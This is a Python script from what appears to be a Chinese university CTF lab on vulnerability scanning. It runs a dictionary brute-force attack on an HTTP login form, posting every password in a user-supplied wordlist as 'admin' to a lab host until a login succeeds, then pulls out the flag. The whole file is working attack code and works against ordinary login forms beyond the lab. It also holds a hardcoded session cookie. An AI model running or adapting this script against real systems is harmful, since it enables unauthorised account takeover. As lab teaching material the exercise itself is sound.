import requests
import re
import http_vlue as hv

print("物智学院CTF平台")
print("课程：漏洞扫描与安全审计")
print("实验6_http-form表单破解")
filewz = input("请输入密码字典路径:")
url = 'http://10.68.6.202:'
port = input("请输入端口:")

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://10.68.6.202:20016',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'http://10.68.6.202:20016/',
    'Cookie': 'session=f5e7ea92-8b35-4a61-8a86-70ec91a4ef8a.XdcaubJQlIBX3Z-qA09rJtqx-dM'
}

username = 'admin'

if hv.get_qx():
    # 从文件中读取密码列表
    with open(filewz, 'r') as file:
        passwords = file.readlines()
        passwords = [password.strip() for password in passwords]

    for password in passwords:
        data = {
            'username': username,
            'password': password,
            'submit': 'Login'
        }

        response = requests.post(url+port, headers=headers, data=data)
        if 'Login failed' not in response.text:  # 检查响应中是否包含登录失败的提示
            print(f"登录成功！用户名: {username}, 密码: {password}")

            # 查找 flag 并输出
            flag_match = re.search(r'Flag(.*?)\n', response.text)
            if flag_match:
                flag = flag_match.group(1).strip()
                print("这个可能是答案:","Flag"+flag)

            break  # 找到正确的密码后跳出循环
        else:
            print(f"登录失败 - 尝试密码: {password}")

    input("密码破解完成！按任意键退出...")
else:
    print("失败，原因：权限不足！")
    input("请按回车键继续...")
